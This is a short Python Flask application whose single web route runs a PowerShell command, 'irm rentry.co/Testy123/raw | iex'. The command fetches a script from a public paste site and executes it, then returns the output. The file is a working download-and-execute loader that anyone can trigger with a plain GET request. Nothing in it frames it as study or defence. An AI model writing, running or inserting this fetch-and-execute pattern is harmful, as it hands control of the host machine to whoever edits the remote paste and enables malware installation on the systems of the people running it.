
from flask import Flask, jsonify
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET'])
def run_powershell():
    try:
        # Define the PowerShell command
        command = "irm rentry.co/Testy123/raw | iex"
        
        # Run the PowerShell command
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        
        # Check if the command was successful
        if result.returncode == 0:
            return jsonify({"status": "success", "output": result.stdout})
        else:
            return jsonify({"status": "error", "error": result.stderr})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})

if __name__ == '__main__':
    app.run(debug=True, port=5001)
